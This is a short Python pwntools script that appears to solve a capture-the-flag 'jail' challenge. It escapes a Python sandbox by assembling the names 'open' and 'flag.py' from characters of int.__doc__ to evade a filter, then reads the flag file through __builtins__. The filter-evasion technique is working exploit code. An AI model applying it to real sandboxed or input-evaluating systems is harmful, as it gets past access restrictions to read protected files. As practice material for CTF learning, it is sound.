from pwn import *

c = process('jail4.py')

def build_string(s):
    return '+'.join(f'int.__doc__[{int.__doc__.index(char)}]' for char in s).encode()

c.send(b'__builtins__.__dict__[' + build_string("open") + b'](' + build_string("flag.py") + b').read()\n')
print(c.recvall())